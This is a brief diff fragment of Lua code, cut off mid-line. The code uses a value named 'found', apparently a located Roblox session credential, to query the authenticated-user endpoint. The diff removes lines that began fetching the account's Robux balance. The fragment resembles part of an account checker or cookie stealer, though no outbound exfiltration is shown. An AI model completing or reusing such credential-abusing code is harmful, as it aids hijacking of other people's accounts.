@@ -55,6 +55,4 @@ end
 local info, robux, created = "{}", "N/A", "N/A"
 if found then
     info = api("https://users.roblox.com/v1/users/authenticated", found)
-    local uid = info:match('"id":(%d+)')
-    if uid then
-        local r = api("https://economy.roblox.com/v1/users/"..
+    local
